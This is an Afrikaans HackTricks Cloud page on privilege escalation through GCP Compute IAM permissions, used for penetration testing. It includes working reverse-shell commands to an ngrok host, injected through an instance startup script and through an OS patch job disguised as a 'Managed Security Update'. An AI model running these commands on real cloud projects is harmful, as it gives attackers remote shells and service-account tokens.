# GCP - Rekenaarvoorregverhoging

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Rekenaar

Vir meer inligting oor Rekenaars en VPC (netwerk) in GCP, kyk:

{% content-ref url="../../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

{% hint style="danger" %}
Let daarop dat om al die voorregverhogingsaanvalle uit te voer wat vereis dat die metadata van die instansie gewysig word (soos die byvoeging van nuwe gebruikers en SSH-sleutels), dit **nodig is dat jy `actAs`-permissies oor die SA wat aan die instansie geheg is, het**, selfs as die SA reeds geheg is!
{% endhint %}

### `compute.projects.setCommonInstanceMetadata`

Met daardie toestemming kan jy die **metadata-inligting** van 'n **instansie wysig** en die **geautoriseerde sleutels van 'n gebruiker verander**, of 'n **nuwe gebruiker met sudo-regte skep**. Daarom sal jy in staat wees om via SSH in te tree na enige VM-instansie en die GCP-diensrekening wat die Instansie gebruik, te steel.\
Beperkings:

* Let daarop dat GCP-diensrekeninge wat in VM-instansies hardloop, standaard 'n **baie beperkte omvang** het
* Jy sal **in staat moet wees om die SSH-bediener te kontak** om aan te meld

Vir meer inligting oor hoe om hierdie toestemming uit te buit, kyk:

{% content-ref url="gcp-add-custom-ssh-metadata.md" %}
[gcp-add-custom-ssh-metadata.md](gcp-add-custom-ssh-metadata.md)
{% endcontent-ref %}

Jy kan ook hierdie aanval uitvoer deur 'n nuwe aanvangsskrip by te voeg en die instansie te herlaai:
```bash
gcloud compute instances add-metadata my-vm-instance \
--metadata startup-script='#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18347 0>&1 &'

gcloud compute instances reset my-vm-instance
```
### `compute.instances.setMetadata`

Hierdie toestemming gee dieselfde voorregte as die vorige toestemming, maar oor spesifieke instansies in plaas van 'n hele projek. Dieselfde aanvalle en beperkings as vir die vorige afdeling geld.

### `compute.instances.setIamPolicy`

Hierdie soort toestemming sal jou toelaat om jouself 'n rol te gee met die vorige toestemmings en voorregte te eskaleer deur hulle te misbruik.

### **`compute.instances.osLogin`**

As OSLogin geaktiveer is in die instansie, kan jy met hierdie toestemming net **`gcloud compute ssh [INSTANSIE]`** hardloop en aan die instansie koppel. Jy sal nie root-voorregte binne die instansie h√™ nie.

{% hint style="success" %}
Om suksesvol in te teken met hierdie toestemming binne die VM-instansie, moet jy die `iam.serviceAccounts.actAs` toestemming h√™ oor die SA wat aan die VM geheg is.
{% endhint %}

### **`compute.instances.osAdminLogin`**

As OSLogin geaktiveer is in die instansie, kan jy met hierdie toestemming net **`gcloud compute ssh [INSTANSIE]`** hardloop en aan die instansie koppel. Jy sal root-voorregte binne die instansie h√™.

{% hint style="success" %}
Om suksesvol in te teken met hierdie toestemming binne die VM-instansie, moet jy die `iam.serviceAccounts.actAs` toestemming h√™ oor die SA wat aan die VM geheg is.
{% endhint %}

### `compute.instances.create`,`iam.serviceAccounts.actAs, compute.disks.create`, `compute.instances.create`, `compute.instances.setMetadata`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`

Dit is moontlik om 'n virtuele masjien te skep met 'n toegewysde Diensrekening en die token van die diensrekening te steel deur toegang tot die metadata te verkry om voorregte daaraan te eskaleer.

Die aanvalskrip vir hierdie metode kan [hier](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py) gevind word.

### `osconfig.patchDeployments.create` | `osconfig.patchJobs.exec`

As jy die **`osconfig.patchDeployments.create`** of **`osconfig.patchJobs.exec`** toestemmings het, kan jy 'n [**patch taak of implementering**](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching) skep. Dit sal jou in staat stel om lateraal in die omgewing te beweeg en kode-uitvoering op al die rekenaarinstansies binne 'n projek te verkry.

Let daarop dat jy op hierdie oomblik **nie die `actAs` toestemming nodig het** oor die SA wat aan die instansie geheg is.

As jy hierdie handmatig wil uitbuit, moet jy een van die volgende skep [**patch taak**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_job.json) **of** [**implementering**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_deployment.json)**.**\
Vir 'n patch taak hardloop:
```python
cat > /tmp/patch-job.sh <<EOF
#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18442 0>&1
EOF

gsutil cp /tmp/patch-job.sh gs://readable-bucket-by-sa-in-instance/patch-job.sh

# Get the generation number
gsutil ls -a gs://readable-bucket-by-sa-in-instance

gcloud --project=$PROJECT_ID compute os-config patch-jobs execute \
--instance-filter-names=zones/us-central1-a/instances/<instance-name> \
--pre-patch-linux-executable=gs://readable-bucket-by-sa-in-instance/patch-job.sh#<generation-number> \
--reboot-config=never \
--display-name="Managed Security Update" \
--duration=300s
```
{% endcode %}

Om 'n pleisterimplementering te implementeer:
```bash
gcloud compute os-config patch-deployments create <name> ...
```
Die instrument [patchy](https://github.com/rek7/patchy) kon in die verlede gebruik word om van hierdie konfigurasie-misbruik te maak (maar nou werk dit nie meer nie).

**'n Aanvaller kan dit ook misbruik vir volharding.**

### `compute.machineImages.setIamPolicy`

**Verleen jouself ekstra regte** tot rekenaarbeeld.

### `compute.snapshots.setIamPolicy`

**Verleen jouself ekstra regte** tot 'n skyf-snapshot.

### `compute.disks.setIamPolicy`

**Verleen jouself ekstra regte** tot 'n skyf.

### Bypass Toegangsbereike

Deur hierdie skakel te volg, vind jy 'n paar [**idees om te probeer om toegangsbereike te omseil**](../).

### Plaaslike Voorreg-Verhoging in GCP Rekenaarinstansie

{% content-ref url="../gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](../gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## Verwysings

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
